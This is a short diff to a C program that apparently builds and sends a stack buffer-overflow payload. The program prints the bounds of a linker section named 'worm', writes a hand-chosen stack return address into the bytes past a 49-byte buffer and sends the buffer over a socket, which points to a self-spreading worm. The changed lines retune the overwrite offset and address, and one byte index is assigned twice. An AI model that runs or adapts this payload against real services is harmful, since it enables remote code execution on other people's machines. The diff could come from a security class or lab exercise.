@@ -84,21 +84,23 @@ cont:
 		}
 		
 		printf("\n%p  %p  %p  %p\n", func, &__start_worm, &__stop_worm, &__start_worm+36);
+		printf("%i\n", n);
 
 		//while ((buff[n++] = getchar()) != '\n')
 		//	;
 		int BUF_SIZE = 49;
 		register long rsp asm ("rsp");
 
-		buff[7+BUF_SIZE+16]= (char) ((rsp & 0xff) + 17);
-		buff[8+BUF_SIZE+16]= (char) 0xde;
-		buff[9+BUF_SIZE+16]= (char) 0xff;
-		buff[10+BUF_SIZE+16]= (char) 0xff;
-		buff[11+BUF_SIZE+16]= (char) 0xff;
-		buff[12+BUF_SIZE+16]= (char) 0xff;
-		buff[12+BUF_SIZE+16]= (char) 0x7f;
-		buff[13+BUF_SIZE+16] = (char) 0x00;
-		buff[14+BUF_SIZE+16] = (char) 0x00;
+		//buff[7+BUF_SIZE+16]= (char) ((rsp & 0xff) + 17);
+		buff[7+BUF_SIZE+0]= (char) 0x60;
+		buff[8+BUF_SIZE+0]= (char) 0xdb;
+		buff[9+BUF_SIZE+0]= (char) 0xff;
+		buff[10+BUF_SIZE+0]= (char) 0xff;
+		buff[11+BUF_SIZE+0]= (char) 0xff;
+		buff[12+BUF_SIZE+0]= (char) 0x7f;
+		buff[12+BUF_SIZE+0]= (char) 0x00;
+		buff[13+BUF_SIZE+0] = (char) 0x00;
+		//buff[14+BUF_SIZE+16] = (char) 0x00;
 
 
 		write(sockfd, buff,sizeof(buff));
